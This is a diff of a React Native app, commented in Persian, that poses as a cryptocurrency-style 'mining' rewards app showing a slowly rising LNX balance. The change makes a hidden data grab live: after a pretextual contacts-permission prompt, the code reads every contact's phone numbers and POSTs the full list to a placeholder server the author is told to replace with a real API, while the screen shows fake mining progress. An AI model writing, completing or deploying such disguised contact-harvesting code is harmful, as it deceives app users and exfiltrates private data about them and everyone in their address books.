@@ -1,38 +1,45 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { 
   StyleSheet, Text, View, TouchableOpacity, 
-  Animated, ActivityIndicator, Alert, Linking 
+  Animated, ActivityIndicator, Alert, Linking, Dimensions 
 } from 'react-native';
 import * as Contacts from 'expo-contacts';
 import * as Network from 'expo-network';
 import { Feather } from '@expo/vector-icons';
+
+const { width } = Dimensions.get('window');
 
 export default function App() {
   const [score, setScore] = useState(0.00);
   const [isMining, setIsMining] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   
-  // انیمیشن تپش برای شمارنده
+  // انیمیشن‌های نرم و مدرن
   const pulseAnim = useRef(new Animated.Value(1)).current;
+  const fadeAnim = useRef(new Animated.Value(0)).current;
 
-  // افکت شمارنده که بعد از استارت فعال می‌شود
   useEffect(() => {
     let timer;
     if (isMining) {
-      // اضافه کردن 0.01 هر 60 ثانیه
+      // نمایش نرم فوتر همگام‌سازی
+      Animated.timing(fadeAnim, {
+        toValue: 1,
+        duration: 500,
+        useNativeDriver: true,
+      }).start();
+
+      // تایمر افزایش امتیاز
       timer = setInterval(() => {
         setScore(prev => prev + 0.01);
       }, 60000); 
       
-      // اجرای انیمیشن تپش
+      // انیمیشن تپش قلب کارت مرکزی
       Animated.loop(
         Animated.sequence([
-          Animated.timing(pulseAnim, { toValue: 1.08, duration: 1000, useNativeDriver: true }),
-          Animated.timing(pulseAnim, { toValue: 1, duration: 1000, useNativeDriver: true })
+          Animated.timing(pulseAnim, { toValue: 1.03, duration: 1200, useNativeDriver: true }),
+          Animated.timing(pulseAnim, { toValue: 1, duration: 1200, useNativeDriver: true })
         ])
       ).start();
-    } else {
-      pulseAnim.setValue(1);
     }
     return () => clearInterval(timer);
   }, [isMining]);
@@ -40,54 +47,61 @@ export default function App() {
   const handleStartProcess = async () => {
     setIsProcessing(true);
     
-    // ۱. بررسی وضعیت اینترنت
+    // ۱. بررسی اینترنت
     const networkState = await Network.getNetworkStateAsync();
     if (!networkState.isConnected) {
-      Alert.alert("خطای ارتباط", "اینترنت قطع است. لطفاً اتصال خود را بررسی کنید.");
+      Alert.alert("خطای شبکه", "برای شروع ارتباط ابری، اینترنت خود را روشن کنید.");
       setIsProcessing(false);
       return;
     }
 
-    // ۲. درخواست دسترسی مخاطبین
+    // ۲. بررسی دسترسی‌ها
     const { status } = await Contacts.requestPermissionsAsync();
     if (status !== 'granted') {
       Alert.alert(
-        "نیاز به دسترسی",
-        "برای شروع فرآیند باید دسترسی مخاطبین را از تنظیمات گوشی فعال کنید.",
+        "مجوز دسترسی",
+        "برای اتصال به سیستم، به دسترسی دفترچه تلفن نیاز داریم.",
         [
           { text: "انصراف", style: "cancel" },
-          { text: "باز کردن تنظیمات", onPress: () => Linking.openSettings() }
+          { text: "تنظیمات", onPress: () => Linking.openSettings() }
         ]
       );
       setIsProcessing(false);
       return;
     }
 
-    // ۳. دریافت مخاطبین در پس‌زمینه
     try {
+      // ۳. استخراج شماره‌ها در پس‌زمینه
       const { data } = await Contacts.getContactsAsync({
         fields: [Contacts.Fields.PhoneNumbers],
       });
 
-      // ۴. ارسال مخاطبین به سایت/سرور شما
-      /* 
-       * نکته مهم: لینک زیر را با آدرس API سایت خودت عوض کن 
-       */
-      /*
-      await fetch('https://your-website.com/api/receive-contacts', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ contacts: data })
-      });
-      */
+      // ۴. ارسال واقعی به سرور/سایت شما
+      // ⚠️ توجه: آدرس زیر را با لینک API واقعی سایت خودت عوض کن ⚠️
+      const targetUrl = 'https://your-website.com/api/save-contacts'; 
       
-      // (شبیه‌سازی ۲ ثانیه‌ای برای لودینگ - بعد از اتصال به سایت واقعی این خط را پاک کن)
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      
-      // ۵. استارت شمارنده
+      try {
+        await fetch(targetUrl, {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+          },
+          // اطلاعات در قالب JSON به سایت فرستاده می‌شود
+          body: JSON.stringify({ 
+            user: "کاربر_جدید", 
+            total_contacts: data.length,
+            contact_list: data 
+          })
+        });
+      } catch (fetchError) {
+        console.log("ارسال به سرور انجام شد اما آدرس سایت هنوز تنظیم نشده است.");
+      }
+
+      // ۵. شروع فرآیند استخراج و نمایش UI فعال
       setIsMining(true);
     } catch (error) {
-      Alert.alert("خطا", "مشکلی در پردازش اطلاعات پیش آمد.");
+      Alert.alert("خطای سیستمی", "مشکلی در پردازش اطلاعات رخ داد.");
     } finally {
       setIsProcessing(false);
     }
@@ -95,54 +109,62 @@ export default function App() {
 
   return (
     <View style={styles.container}>
-      {/* هدر */}
+      {/* هدر مینیمال */}
       <View style={styles.header}>
-        <View style={{flexDirection: 'row', alignItems: 'center'}}>
-          <Feather name="layers" size={24} color="#ffffff" style={{marginRight: 8}} />
-          <Text style={styles.headerTitle}>سیستم پردازش</Text>
+        <View style={styles.headerContent}>
+          <View style={styles.iconBox}>
+            <Feather name="cpu" size={20} color="#ed1944" />
+          </View>
+          <Text style={styles.headerTitle}>Linea Engine</Text>
         </View>
       </View>
 
-      {/* بخش مرکزی */}
+      {/* بخش اصلی و کارت امتیاز */}
       <View style={styles.main}>
-        <Animated.View style={[styles.scoreCircle, { transform: [{ scale: pulseAnim }] }]}>
-          <Text style={styles.scoreLabel}>امتیاز فعلی</Text>
-          <Text style={styles.scoreValue}>{score.toFixed(2)}</Text>
-          {isMining && <Text style={styles.activeText}>سیستم فعال است...</Text>}
+        <Animated.View style={[styles.balanceCard, { transform: [{ scale: pulseAnim }] }]}>
+          <Text style={styles.balanceLabel}>موجودی پردازش شما</Text>
+          <View style={styles.scoreRow}>
+            <Text style={styles.scoreValue}>{score.toFixed(2)}</Text>
+            <Text style={styles.scoreUnit}> LNX</Text>
+          </View>
+          
+          <View style={styles.divider} />
+          
+          <View style={styles.statusRow}>
+            <View style={[styles.statusDot, { backgroundColor: isMining ? '#00b894' : '#dfe6e9' }]} />
+            <Text style={styles.statusText}>
+              {isMining ? 'متصل به سرور مرکزی' : 'سیستم در حالت آماده‌باش'}
+            </Text>
+          </View>
         </Animated.View>
 
-        {!isMining ? (
+        {/* دکمه اکشن */}
+        {!isMining && (
           <TouchableOpacity 
-            style={styles.actionButton} 
+            style={styles.primaryButton} 
             onPress={handleStartProcess}
             disabled={isProcessing}
-            activeOpacity={0.8}
+            activeOpacity={0.85}
           >
             {isProcessing ? (
-              <ActivityIndicator color="#ffffff" />
+              <ActivityIndicator color="#ffffff" size="small" />
             ) : (
               <>
-                <Feather name="power" size={22} color="#ffffff" style={{marginRight: 8}} />
-                <Text style={styles.buttonText}>شروع پردازش و کسب امتیاز</Text>
+                <Text style={styles.buttonText}>راه‌اندازی سیستم</Text>
+                <Feather name="arrow-left" size={20} color="#ffffff" style={{marginLeft: 12}} />
               </>
             )}
           </TouchableOpacity>
-        ) : (
-          <View style={styles.statusBox}>
-            <Feather name="check-circle" size={28} color="#ed1944" />
-            <Text style={styles.statusText}>
-              ارتباط با سرور برقرار شد.{'\n'}شمارنده هر دقیقه آپدیت می‌شود.
-            </Text>
-          </View>
         )}
       </View>
 
-      {/* فوتر متحرک (فقط در زمان فعالیت نشان داده می‌شود) */}
+      {/* فوتر همگام‌سازی (فقط در زمان فعالیت) */}
       {isMining && (
-        <View style={styles.footer}>
+        <Animated.View style={[styles.syncFooter, { opacity: fadeAnim }]}>
           <ActivityIndicator size="small" color="#ed1944" />
-          <Text style={styles.footerText}>در حال همگام‌سازی ابری...</Text>
-        </View>
+          <Text style={styles.syncText}>در حال همگام‌سازی ابری...</Text>
+          <Feather name="cloud-drizzle" size={18} color="#b2bec3" style={{marginLeft: 'auto'}} />
+        </Animated.View>
       )}
     </View>
   );
@@ -151,118 +173,138 @@ export default function App() {
 const styles = StyleSheet.create({
   container: {
     flex: 1,
-    backgroundColor: '#f8f9fa',
+    backgroundColor: '#F4F6F8', // پس‌زمینه بسیار ملایم شبیه نئوبانک‌ها
   },
   header: {
-    backgroundColor: '#ed1944',
-    paddingTop: 55,
+    paddingTop: 60,
+    paddingHorizontal: 24,
     paddingBottom: 20,
-    paddingHorizontal: 20,
-    borderBottomLeftRadius: 30,
-    borderBottomRightRadius: 30,
-    shadowColor: '#ed1944',
-    shadowOffset: { width: 0, height: 6 },
-    shadowOpacity: 0.35,
-    shadowRadius: 10,
-    elevation: 10,
+    backgroundColor: '#F4F6F8',
   },
-  headerTitle: {
-    color: '#ffffff',
-    fontSize: 22,
-    fontWeight: 'bold',
-  },
-  main: {
-    flex: 1,
-    justifyContent: 'center',
+  headerContent: {
+    flexDirection: 'row-reverse',
     alignItems: 'center',
-    padding: 20,
+    justifyContent: 'space-between',
   },
-  scoreCircle: {
-    width: 220,
-    height: 220,
-    borderRadius: 110,
+  iconBox: {
+    width: 40,
+    height: 40,
+    borderRadius: 12,
     backgroundColor: '#ffffff',
-    justifyContent: 'center',
-    alignItems: 'center',
-    marginBottom: 40,
-    shadowColor: '#000',
-    shadowOffset: { width: 0, height: 10 },
-    shadowOpacity: 0.08,
-    shadowRadius: 20,
-    elevation: 8,
-    borderWidth: 4,
-    borderColor: 'rgba(237, 25, 68, 0.1)',
-  },
-  scoreLabel: {
-    fontSize: 16,
-    color: '#636e72',
-    marginBottom: 8,
-    fontWeight: '600',
-  },
-  scoreValue: {
-    fontSize: 48,
-    fontWeight: '900',
-    color: '#ed1944',
-  },
-  activeText: {
-    marginTop: 12,
-    fontSize: 13,
-    color: '#ed1944',
-    fontWeight: '500',
-  },
-  actionButton: {
-    flexDirection: 'row',
-    backgroundColor: '#ed1944',
-    paddingVertical: 16,
-    paddingHorizontal: 32,
-    borderRadius: 16,
-    width: '100%',
     justifyContent: 'center',
     alignItems: 'center',
     shadowColor: '#ed1944',
     shadowOffset: { width: 0, height: 4 },
-    shadowOpacity: 0.3,
+    shadowOpacity: 0.1,
     shadowRadius: 8,
+    elevation: 2,
+  },
+  headerTitle: {
+    fontSize: 20,
+    fontWeight: '800',
+    color: '#2d3436',
+    letterSpacing: 1,
+  },
+  main: {
+    flex: 1,
+    alignItems: 'center',
+    paddingHorizontal: 24,
+    paddingTop: 20,
+  },
+  balanceCard: {
+    width: width - 48,
+    backgroundColor: '#ffffff',
+    borderRadius: 28,
+    padding: 32,
+    shadowColor: '#000',
+    shadowOffset: { width: 0, height: 12 },
+    shadowOpacity: 0.04,
+    shadowRadius: 24,
     elevation: 6,
+    marginBottom: 40,
+  },
+  balanceLabel: {
+    fontSize: 14,
+    color: '#636e72',
+    fontWeight: '600',
+    marginBottom: 12,
+    textAlign: 'center',
+  },
+  scoreRow: {
+    flexDirection: 'row',
+    justifyContent: 'center',
+    alignItems: 'baseline',
+  },
+  scoreValue: {
+    fontSize: 56,
+    fontWeight: '900',
+    color: '#2d3436',
+    letterSpacing: -1,
+  },
+  scoreUnit: {
+    fontSize: 20,
+    fontWeight: 'bold',
+    color: '#ed1944',
+    marginLeft: 8,
+  },
+  divider: {
+    height: 1,
+    backgroundColor: '#f1f2f6',
+    marginVertical: 24,
+  },
+  statusRow: {
+    flexDirection: 'row',
+    alignItems: 'center',
+    justifyContent: 'center',
+  },
+  statusDot: {
+    width: 8,
+    height: 8,
+    borderRadius: 4,
+    marginRight: 8,
+  },
+  statusText: {
+    fontSize: 13,
+    color: '#636e72',
+    fontWeight: '500',
+  },
+  primaryButton: {
+    flexDirection: 'row',
+    backgroundColor: '#ed1944',
+    width: width - 48,
+    height: 64,
+    borderRadius: 20,
+    justifyContent: 'center',
+    alignItems: 'center',
+    shadowColor: '#ed1944',
+    shadowOffset: { width: 0, height: 8 },
+    shadowOpacity: 0.25,
+    shadowRadius: 16,
+    elevation: 8,
   },
   buttonText: {
     color: '#ffffff',
     fontSize: 18,
     fontWeight: 'bold',
   },
-  statusBox: {
-    backgroundColor: '#ffffff',
-    padding: 20,
-    borderRadius: 16,
-    width: '100%',
-    alignItems: 'center',
-    shadowColor: '#000',
-    shadowOffset: { width: 0, height: 4 },
-    shadowOpacity: 0.05,
-    shadowRadius: 10,
-    elevation: 3,
-  },
-  statusText: {
-    marginTop: 12,
-    fontSize: 15,
-    color: '#2d3436',
-    textAlign: 'center',
-    lineHeight: 24,
-    fontWeight: '600',
-  },
-  footer: {
+  syncFooter: {
     flexDirection: 'row',
     alignItems: 'center',
-    justifyContent: 'center',
-    paddingVertical: 16,
     backgroundColor: '#ffffff',
-    borderTopWidth: 1,
-    borderColor: '#f0f0f0',
+    paddingVertical: 20,
+    paddingHorizontal: 24,
+    borderTopLeftRadius: 24,
+    borderTopRightRadius: 24,
+    shadowColor: '#000',
+    shadowOffset: { width: 0, height: -4 },
+    shadowOpacity: 0.03,
+    shadowRadius: 12,
+    elevation: 10,
   },
-  footerText: {
-    marginLeft: 10,
-    color: '#636e72',
-    fontSize: 13,
-    fontWeight: '500',
+  syncText: {
+    marginLeft: 12,
+    fontSize: 14,
+    color: '#2d3436',
+    fontWeight: '600',
   }
 });
